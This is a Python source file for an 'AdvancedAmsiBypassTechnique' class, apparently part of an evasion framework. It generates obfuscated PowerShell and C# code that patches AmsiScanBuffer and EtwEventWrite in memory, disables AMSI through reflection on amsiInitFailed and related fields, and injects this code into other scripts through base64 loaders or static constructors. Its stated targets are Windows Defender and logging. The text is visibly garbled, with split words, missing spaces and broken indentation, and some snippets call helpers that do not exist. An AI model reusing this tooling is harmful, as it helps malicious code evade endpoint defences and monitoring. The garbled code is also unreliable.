import random



import str in g



import struct



import bas e64



import has hlib



from typ in gimport List,Dict,Any,Optional,Union,Set







from core.interfacesimport Bas eEvas ionTechnique







clas sAdvancedAmsiBypas sTechnique(Bas eEvas ionTechnique):











def__init__(self):







        self._formats=["powershell","csharp","jscript","vbscript"]











self.bypas s_techniques={



"memory_patch in g":self._generate_memory_patch in g,



"reflection":self._generate_reflection_bypas s,



"buffer_overflow":self._generate_buffer_overflow,



"com_hijack in g":self._generate_com_hijack in g,



"dll_unload in g":self._generate_dll_unload in g,



"etw_patch in g":self._generate_etw_bypas s,



"context_patch in g":self._generate_context_patch in g,



"type_confusion":self._generate_type_confusion,



"forced_error":self._generate_forced_error_bypas s,



"delegate_abuse":self._generate_delegate_abuse



}











self.amsi_targets={



"AmsiScanBuffer":0x01,



"AmsiScanStr in g":0x02,



"AmsiOpenSession":0x04,



"AmsiInitialize":0x08,



"AmsiUn in itialize":0x10



}











self.bypas s_strategies={



"standard":["memory_patch in g","reflection"],



"aggressive":["memory_patch in g","buffer_overflow","dll_unload in g"],



"stealthy":["reflection","com_hijack in g","context_patch in g","delegate_abuse"],



"comprehensive":list(self.bypas s_techniques.keys())



}







defapply(self,



code:str,



target_environments:List[str]=None,



bypas s_level:str="medium",



customize_params:Dict[str,Any]=None)->str:











language=self._detect_language(code)



if languagenot in self._formats:







            return code











params=customize_paramsor{}



target_env=target_environmentsor["powershell"]if language=="powershell"else["dotnet"]



obfuscate=params.get("obfuscate",True)



delayed_execution=params.get("delayed_execution",False)



multi_stage=params.get("multi_stage",False)











strategy=self._select_bypas s_strategy(bypas s_level)











session_key=''.join(random.choices(str in g.as cii_letters+str in g.digits,k=16))











bypas s_code=self._generate_bypas s_code(language,strategy,session_key,obfuscate,delayed_execution)











if language=="powershell":







            result=self._inject_powershell_bypas s(code,bypas s_code,multi_stage)



elif language=="csharp":







            result=self._inject_csharp_bypas s(code,bypas s_code)



elif languagein["jscript","vbscript"]:







            result=self._inject_script_bypas s(code,bypas s_code,language)



else:



            result=code







return result







defsupported_formats(self)->List[str]:







return self._formats







defget_evas ion_targets(self)->List[str]:







return[



"W in dows Defender",



"AMSI",



"PowerShell Security",



"ETW Logg in g",



"Script Block Logg in g",



"AppLocker Script Rules"



]







defis_compatible_with(self,other_technique:'Bas eEvas ionTechnique')->bool:











incompatible_techniques=[



"DefenderExclusionTechnique",



"PSModuleLoad in gTechnique"



]











other_clas s_name=other_technique.__clas s__.__name__











for in compatible in incompatible_techniques:



            if incompatible in other_clas s_name:



                return False







return True







defget_detection_probability(self)->float:











return0.15















def_detect_language(self,code:str)->str:











code_lower=code.lower()







if"function "incode_lowerand("{"incode_loweror"}"incode_lower):



            if"wscript"incode_loweror"activexobject"incode_lower:



                return"jscript"







if"sub "incode_lowerand"end sub"incode_lower:



            return"vbscript"







if"us in g system;"incode_loweror"namespace "incode_loweror"clas s "incode_lower:



            return"csharp"







if"$"incode_loweror"write-host"incode_loweror"-eq"incode_loweror"param("incode_lower:



            return"powershell"











return"powershell"







def_select_bypas s_strategy(self,bypas s_level:str)->List[str]:







if bypas s_level=="bas ic":



            return self.bypas s_strategies["standard"]



elif bypas s_level=="medium":



            return self.bypas s_strategies["standard"]+random.sample(self.bypas s_strategies["stealthy"],1)



elif bypas s_level=="advanced":



            return self.bypas s_strategies["aggressive"]+random.sample(self.bypas s_strategies["stealthy"],2)



elif bypas s_level=="extreme":



            return self.bypas s_strategies["comprehensive"]



else:



            return self.bypas s_strategies["standard"]







def_generate_bypas s_code(self,



language:str,



strategy:List[str],



session_key:str,



obfuscate:bool,



delayed:bool)->str:











num_techniques=min(3,len(strategy))



selected_techniques=random.sample(strategy,num_techniques)











bypas s_components=[]







fortechnique in selected_techniques:



            if technique in self.bypas s_techniques:



                component=self.bypas s_techniques[technique](language,session_key)



if component:



                    bypas s_components.append(component)











if language=="powershell":



            bypas s_code="\n".join(bypas s_components)











if delayed:



                delay_ms=random.rand in t(1000,3000)



delay_code=f"Start-Sleep -Milliseconds {delay_ms}"



bypas s_code=f"{delay_code}\n{bypas s_code}"











if obfuscate:



                bypas s_code=self._obfuscate_powershell(bypas s_code,session_key)







elif language=="csharp":



            bypas s_code="us in g System;\nus in g System.Runtime.InteropServices;\n\n"



bypas s_code+="namespace AmsiBypas s {\n"



bypas s_code+="    public static clas s Bypas s {\n"







forcomponent in bypas s_components:



                bypas s_code+=self._indent(component,8)+"\n"







bypas s_code+="    }\n}\n"











if obfuscate:



                bypas s_code=self._obfuscate_csharp(bypas s_code)







else:



            bypas s_code="\n".join(bypas s_components)











if obfuscate:



                bypas s_code=self._obfuscate_script(bypas s_code,language)







return bypas s_code















def_inject_powershell_bypas s(self,code:str,bypas s_code:str,multi_stage:bool)->str:







if multi_stage:







            stage1=self._generate_powershell_loader(bypas s_code)



return f"{stage1}\n\n{code}"



else:







            return f"{bypas s_code}\n\n{code}"







def_inject_csharp_bypas s(self,code:str,bypas s_code:str)->str:











import re











clas s_match=re.search(r'(public\s+)?clas s\s+(\w+)',code)



if clas s_match:



            clas s_pos=clas s_match.start()



clas s_name=clas s_match.group(2)











static_ctor=f"\n    static {clas s_name}() {{\n"



static_ctor+="        try {\n"



static_ctor+=f"{self._indent(bypas s_code, 12)}\n"



static_ctor+="        } catch { }\n"



static_ctor+="    }\n"











open_brace_pos=code.f in d('{',clas s_pos)



if open_brace_pos>0:



                return code[:open_brace_pos+1]+static_ctor+code[open_brace_pos+1:]











return bypas s_code+"\n\n"+code







def_inject_script_bypas s(self,code:str,bypas s_code:str,language:str)->str:











return bypas s_code+"\n\n"+code







def_generate_powershell_loader(self,payload:str)->str:











encoded=bas e64.b64encode(payload.encode('utf-16le')).decode()











var_encoded=self._random_var_name()



var_command=self._random_var_name()











loader=f"""
${var_encoded} = "{encoded}"
${var_command} = [System.Text.Encod in g]::Unicode.GetStr in g([System.Convert]::FromBas e64Str in g($({var_encoded})))
&([scriptblock]::Create($({var_command})))
"""



return loader















def_generate_memory_patch in g(self,language:str,key:str)->str:







if language=="powershell":



            var_dll=self._random_var_name()



var_buffer=self._random_var_name()



var_address=self._random_var_name()







return f"""
${var_dll} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPo in ter((Get-ProcAddress amsi.dll AmsiScanBuffer), (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([UInt32])))
${var_buffer} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(6)
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, ${var_buffer}, 6)
${ f"${var_address}" } = Get-DelegateAddress ${ f"${var_dll}" }
Protect-Memory ${ f"${var_address}" } 6 0x40
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, ${ f"${var_address}" }, 6)
Protect-Memory ${ f"${var_address}" } 6 0x20
[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${ f"${var_buffer}" })
"""



elif language=="csharp":



            return"""
public static void PatchAmsi() {
    try {
        var lib = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(lib, "AmsiScanBuffer");
        
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        
        IntPtr oldProtect = IntPtr.Zero;
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
        
        Marshal.Copy(patch, 0, addr, patch.Length);
        
        VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect.ToInt32(), out oldProtect);
    }
    catch {
    }
}

[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(str in g name);

[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, str in g procName);

[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, u in t flNewProtect, out IntPtr lpflOldProtect);
"""



else:



            return""







def_generate_reflection_bypas s(self,language:str,key:str)->str:







if language=="powershell":



            var_context=self._random_var_name()



var_field=self._random_var_name()







return f"""
${ f"${var_context}" } = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
${ f"${var_field}" } = ${ f"${var_context}" }.GetField('amsiInitFailed', 'NonPublic,Static')
${ f"${var_field}" }.SetValue($null, $true)
"""



elif language=="csharp":



            return"""
public static void AmsiBypas sReflection() {
    try {
        var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
        var amsiInitFailedField = amsiUtils.GetField("amsiInitFailed", System.Reflection.B in dingFlags.NonPublic | System.Reflection.B in dingFlags.Static);
        amsiInitFailedField.SetValue(null, true);
    }
    catch {
    }
}
"""



else:



            return""







def_generate_buffer_overflow(self,language:str,key:str)->str:







if language=="powershell":



            var_buffer=self._random_var_name()



var_size=random.rand in t(1024*1024,10*1024*1024)







return f"""
${ f"${var_buffer}" } = "A" * {var_size}
[System.Management.Automation.AmsiUtils]::ScanContent(${ f"${var_buffer}" }, "test")
"""



else:



            return""







def_generate_com_hijack in g(self,language:str,key:str)->str:







if language=="powershell":



            var_clsid=self._random_var_name()







return f"""
${ f"${var_clsid}" } = New-Object Guid 'E48E8A3C-0701-11D1-8C65-00C04FC2AA53'
[ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession', 'NonPublic,Static').SetValue($null, $null)
"""



elif language=="csharp":



            return"""
public static void AmsiComHijack in g() {
    try {
        Type amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
        amsiUtils.GetField("amsiSession", System.Reflection.B in dingFlags.NonPublic | System.Reflection.B in dingFlags.Static).SetValue(null, null);
    }
    catch {
    }
}
"""



else:



            return""







def_generate_dll_unload in g(self,language:str,key:str)->str:







if language=="powershell":



            var_handle=self._random_var_name()







return f"""
${ f"${var_handle}" } = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Process').GetMethod('GetCurrentProcess').Invoke($null, @())
${ f"${var_handle}" }.GetType().GetMethod('GetModules').Invoke(${ f"${var_handle}" }, @()).Where{({$_.FileName -like "*amsi.dll"})}.ForEach{({$_.Bas eAddress.ToInt64()})} | ForEach-Object {{
    $null = [System.Runtime.InteropServices.Marshal]::FreeHGlobal($_)
}}
"""



else:



            return""







def_generate_etw_bypas s(self,language:str,key:str)->str:







if language=="powershell":



            var_etw=self._random_var_name()







return f"""
${ f"${var_etw}" } = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPo in ter((Get-ProcAddress ntdll.dll EtwEventWrite), (Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr]) ([UInt32])))
$bptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
[Runtime.InteropServices.Marshal]::WriteByte($bptr, 0, 0xc3)
Protect-Memory (Get-DelegateAddress ${ f"${var_etw}" }) 1 0x40
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xc3), 0, (Get-DelegateAddress ${ f"${var_etw}" }), 1)
Protect-Memory (Get-DelegateAddress ${ f"${var_etw}" }) 1 0x20
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($bptr)
"""



elif language=="csharp":



            return"""
public static void DisableEtw() {
    try {
        var ntdllHandle = LoadLibrary("ntdll.dll");
        var etwEventWritePtr = GetProcAddress(ntdllHandle, "EtwEventWrite");
        
        byte[] patch = { 0xC3 };
        
        IntPtr oldProtect = IntPtr.Zero;
        VirtualProtect(etwEventWritePtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
        
        Marshal.Copy(patch, 0, etwEventWritePtr, patch.Length);
        
        VirtualProtect(etwEventWritePtr, (UIntPtr)patch.Length, oldProtect.ToInt32(), out oldProtect);
    }
    catch {
    }
}
"""



else:



            return""







def_generate_context_patch in g(self,language:str,key:str)->str:







if language=="powershell":



            var_context=self._random_var_name()



var_field=self._random_var_name()







return f"""
${ f"${var_context}" } = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
${ f"${var_field}" } = ${ f"${var_context}" }.GetField('amsiContext', 'NonPublic,Static')
if (${ f"${var_field}" }) {{ ${ f"${var_field}" }.SetValue($null, $null) }}
"""



else:



            return""







def_generate_type_confusion(self,language:str,key:str)->str:







if language=="powershell":



            var_type=self._random_var_name()



var_field=self._random_var_name()







return f"""
${ f"${var_type}" } = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
${ f"${var_field}" } = ${ f"${var_type}" }.GetField('amsiSession', 'NonPublic,Static')
${ f"${var_field}" }.SetValue($null, [IntPtr]::Zero)
"""



else:



            return""







def_generate_forced_error_bypas s(self,language:str,key:str)->str:







if language=="powershell":



            return"""
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""



else:



            return""







def_generate_delegate_abuse(self,language:str,key:str)->str:







if language=="powershell":



            var_delegate=self._random_var_name()







return f"""
${ f"${var_delegate}" } = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPo in ter(
    (Get-ProcAddress amsi.dll AmsiScanBuffer),
    (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([UInt32]))
)
$patches = @(
    [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
)
Emit-ShellcodeDelegate ${ f"${var_delegate}" } $patches
"""



else:



            return""















def_obfuscate_powershell(self,code:str,key:str)->str:











import re











functions=re.f in dall(r'\[([^\]]+)\]',code)



forfunc in functions:



            if'.'infuncandlen(func)>10:



                parts=func.split('.')



if len(parts)>=2:







                    obfuscated="'+"+"'+".join([f"'{part}"forpart in parts])+"'"



code=code.replace(f"[{func}]",f"[{{{obfuscated}}}]")











str in gs=re.f in dall(r'"([^"\\]*(?:\\.[^"\\]*)*)"',code)



forstr in ginstr in gs:



            if len(str in g)>5andnotstr in g.startswith("$")and" "not in str in g:



                chars=[]



forchar in str in g:



                    chars.append(f"[char]{ord(char)}")







obfuscated="-join @("+",".join(chars)+")"



code=code.replace(f'"{str in g}"',obfuscated)











forkeywordin["amsi","bypas s","AmsiScanBuffer","amsiUtils"]:



            if keyword in code:



                obfuscated=self._obfuscate_str in g(keyword,key)



code=code.replace(keyword,obfuscated)







return code







def_obfuscate_csharp(self,code:str)->str:















obfuscated=code.replace("AmsiBypas s","SecurityUtil")



obfuscated=obfuscated.replace("amsi.dll","a"+"".join(random.choices("msi",k=3))+".dll")







return obfuscated







def_obfuscate_script(self,code:str,language:str)->str:











if language=="jscript":



            return self._obfuscate_jscript(code)



else:



            return code







def_obfuscate_jscript(self,code:str)->str:











return code.replace("WScript","/**/WScript/**/")







def_obfuscate_str in g(self,text:str,key:str)->str:











result=[]



forchar in text:



            result.append(f"'{char}'")







return"+".join(result)







def_random_var_name(self)->str:







prefix=random.choice(["var","tmp","obj","ctx","ptr","data","buf"])



suffix=''.join(random.choices(str in g.as cii_lowercas e+str in g.digits,k=5))



return f"{prefix}{suffix}"







def_indent(self,text:str,spaces:int)->str:







indent_str=' '*spaces



return'\n'.join(indent_str+l in eif l in e.strip()elsel in e



forl in eintext.splitl in es())